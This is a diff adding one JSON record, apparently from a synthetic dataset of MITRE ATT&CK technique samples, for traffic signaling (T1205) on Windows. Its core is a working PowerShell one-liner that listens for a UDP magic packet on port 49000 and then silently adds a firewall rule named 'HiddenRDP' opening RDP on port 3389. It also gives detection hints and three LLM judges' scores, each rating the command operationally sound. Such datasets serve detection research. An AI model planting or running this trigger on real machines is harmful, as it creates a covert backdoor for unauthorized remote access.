@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$port=49000;$magic='CA-FE-BA-BE-00-01';$u=New-Object System.Net.Sockets.UdpClient($port);$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);while($true){$buf=$u.Receive([ref]$ep);if([BitConverter]::ToString($buf) -eq $magic){& netsh advfirewall firewall add rule name='HiddenRDP' dir=in action=allow protocol=TCP localport=3389;break}}",
+  "explanation": "Listens for a specific UDP magic packet (CA-FE-BA-BE-00-01) on port 49000. Upon receipt, it opens an inbound Windows Firewall rule for RDP (TCP/3389), enabling access only after the covert signal. Requires elevated PowerShell (UAC) because it modifies firewall rules via netsh.",
+  "rationale_steps": [
+    "Open a UDP listener on a high port to await a secret magic packet.",
+    "When the exact magic bytes arrive, use netsh to add an inbound firewall rule opening TCP/3389.",
+    "Detection: monitor Security Event IDs 4946/4947 (firewall rule changes), Sysmon EID 1 for netsh.exe invocation, and unusual UDP packets to high ports with fixed payloads."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-c04e392e",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell one-liner with balanced braces/quotes, valid [ref] usage for UdpClient.Receive, and correct invocation of netsh via the call operator.",
+        "semantic_score": 5,
+        "semantic_justification": "It implements a UDP magic-packet trigger to covertly enable an RDP firewall rule, aligning with T1205 traffic signaling and is operationally plausible assuming elevation as noted.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T13:43:02.036837Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced quotes/parentheses/braces, appropriate semicolons as command separators, and correct method calls with no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by listening for a specific magic packet pattern on UDP port 49000 and only enabling RDP access through the firewall after receiving this covert signal, demonstrating a realistic implementation of T1205.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:43:05.281989Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, with correct variable assignments, loop structure, method calls, conditional logic, external command execution, and proper use of separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly achieves its claimed intent of using a 'magic packet' for traffic signaling (T1205) to covertly open an RDP firewall rule, which is operationally plausible and aligns with the technique description.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T13:43:18.728192Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
